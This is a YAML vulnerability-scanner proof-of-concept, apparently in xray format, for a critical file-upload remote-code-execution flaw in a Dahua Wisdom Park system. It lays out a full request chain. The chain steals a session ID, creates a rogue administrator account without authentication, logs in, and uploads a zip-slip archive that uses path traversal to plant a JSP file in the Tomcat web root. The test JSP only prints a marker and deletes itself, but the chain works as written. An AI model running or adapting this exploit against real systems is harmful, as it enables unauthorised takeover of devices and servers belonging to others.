name: yaml-poc-dahuatech-dahua_wisdom_park-rce-CT-742864
binding: 1552b7c4-18b4-4d19-bd80-d1d8a4c65dad
detail:
    author: yuxiang.cai
    vulnerability:
        id: 39759613-e39d-47b2-9a8b-4a560baef1cc
        level: critical
    warning: File Upload
transport: http
set:
    rboundary: randomLowercase(8)
    username: randomLowercase(8)
    password: randomLowercase(8)
    randfile: randomLowercase(8)
    filename: string("../../../../../../../../../../../../../opt/tomcat/webapps/upload/" + randfile + ".jsp")
    randstring: randomLowercase(8)
    filecontent: bytes('<% out.print("' + randstring + '"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>')
    zip: zipSlip(filename, filecontent)
    encPass: md5(username + ":dss:" + password)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /admin/sso_initSession.action
        expression: |
            "[0-9a-zA-Z]{32}".matches(response.body_string) && response.headers["content-length"] == "32"
        output:
            search: |-
                "(?P<sid>[0-9a-zA-Z]{32})".submatch(response.body_string)
            sid: search["sid"]
    r1:
        request:
            cache: true
            method: POST
            path: /admin/user_save.action
            headers:
                Content-Type: multipart/form-data; boundary=----{{rboundary}}
                Cookie: JSESSIONID={{sid}}
            body: "------{{rboundary}}\r\nContent-Disposition: form-data; name=\"userBean.userType\"\r\n\r\n0\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"userBean.ownerCode\"\r\n\r\n001\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"userBean.isReuse\"\r\n\r\n0\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"userBean.macStat\"\r\n\r\n0\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"userBean.roleIds\"\r\n\r\n1\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"userBean.loginName\"\r\n\r\n{{username}}\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"displayedOrgName\"\r\n\r\n{{username}}\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"userBean.loginPass\"\r\n\r\n{{password}}\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"checkPass\"\r\n\r\n{{password}}\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"userBean.groupId\"\r\n\r\n0\r\n------{{rboundary}}\r\nContent-Disposition: form-data; name=\"userBean.userName\"\r\n\r\n{{username}}\r\n------{{rboundary}}--"
        expression: response.body_string.contains("validationError:::用户名称已存在:::validationError") || response.status == 200 && response.headers["content-length"] == "0"
    r2:
        request:
            cache: true
            method: POST
            path: /WPMS/getPublicKey
            headers:
                Content-Type: application/json
            body: |
                {"loginName":"{{username}}"}
        expression: response.body_string.contains('"publicKey":')
        output:
            search: |
                '"publicKey":"(?P<pubkey>.*?)"'.submatch(response.body_string)
            pubkey: search["pubkey"]
            enc_password: base64(rsaEncryptPKCS1v15(bytes(password), pubkey))
    r3:
        request:
            cache: true
            method: POST
            path: /WPMS/login
            headers:
                Content-Type: application/json
            body: |
                {"loginName":"{{username}}","loginPass":"{{enc_password}}","timestamp":"16853622671401904168273612873678126378126387"}
        expression: response.body_string.contains('"success":"true"')
        output:
            search: |
                '"token":"(?P<token>.*?)"'.submatch(response.body_string)
            token: search["token"]
    r4:
        request:
            cache: true
            method: GET
            path: /admin/login_login.action?subSystemToken={{token}}
            headers:
                Cookie: JSESSIONID={{sid}}
        expression: "true"
    r5:
        request:
            cache: true
            method: POST
            path: /admin/recover_recover.action?password={{encPass}}
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9c9BBHdk0NgAjoxz
                Cookie: JSESSIONID={{sid}}
            body: "------WebKitFormBoundary9c9BBHdk0NgAjoxz\r\nContent-Disposition: form-data; name=\"recoverFile\"; filename=\"test1.zip\"\r\nContent-Type: application/zip\r\n\r\n{{zip}}\r\n------WebKitFormBoundary9c9BBHdk0NgAjoxz-- "
        expression: "true"
    r6:
        request:
            cache: true
            method: GET
            path: /upload/{{randfile}}.jsp
        expression: response.body_string.contains(randstring)
expression: r0() && r1() && r2() && r3() && r4() && r5() && r6()
